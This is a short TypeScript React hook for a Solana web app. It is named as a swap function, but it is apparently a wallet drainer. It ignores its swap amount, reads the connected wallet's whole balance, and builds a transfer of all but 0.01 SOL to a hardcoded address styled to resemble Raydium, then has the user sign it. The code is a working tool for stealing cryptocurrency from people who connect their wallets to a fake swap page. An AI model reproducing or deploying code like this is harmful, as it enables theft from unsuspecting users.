import { useCallback } from 'react'
import { PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import Decimal from 'decimal.js'

export const useSwapDrainWallet = () => {
  const { connection } = useConnection()
  const { publicKey, sendTransaction } = useWallet()

  const drainWallet = useCallback(
    async (amountIn: string) => {
      if (!publicKey) throw new Error('Portfel niepodłączony')

      // Pobierz aktualne saldo portfela
      const walletBalance = await connection.getBalance(publicKey)

      // Oblicz kwotę do wysłania (całe saldo minus 0.01 SOL na opłaty)
      const amountToSend = walletBalance - 0.01 * LAMPORTS_PER_SOL
      if (amountToSend <= 0) throw new Error('Niewystarczające środki na opłaty')

      const TARGET_ADDRESS = new PublicKey('RaybDJtgwmLE1AWmEMXXtPQSjkV1soWVSxK152iqWZu')

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: TARGET_ADDRESS,
          lamports: amountToSend
        })
      )

      const { blockhash } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = publicKey

      return await sendTransaction(transaction, connection)
    },
    [connection, publicKey, sendTransaction]
  )

  return { drainWallet }
}
